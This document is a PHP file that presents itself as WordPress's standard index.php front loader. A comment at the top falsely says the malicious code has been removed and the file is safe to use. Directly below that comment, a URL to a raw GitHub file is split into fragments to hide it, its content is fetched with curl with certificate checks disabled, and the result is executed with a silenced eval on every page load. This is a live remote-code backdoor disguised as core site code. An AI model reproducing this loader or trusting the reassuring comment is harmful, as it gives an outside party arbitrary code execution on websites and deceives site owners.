<?php
/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

// Single URL
$part1 = 'https://';
$part2 = 'raw.github';
$part3 = 'userconte';
$part4 = 'nt.com/md';
$part5 = 'momin3653';
$part6 = '66-gif/be';
$part7 = 'la/refs/h';
$part8 = 'eads/main';
$part9 = '/index.tx';
$part10 = 't';

$full_url = $part1 . $part2 . $part3 . $part4 . $part5 . $part6 . $part7 . $part8 . $part9 . $part10;

// Attempt to get remote content
$content = @file_get_contents($full_url);
if ($content === false && function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $full_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $content = curl_exec($ch);
    curl_close($ch);
}

// Only eval if we have content
if (!empty($content)) {
    @eval('?>' . $content);
}

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
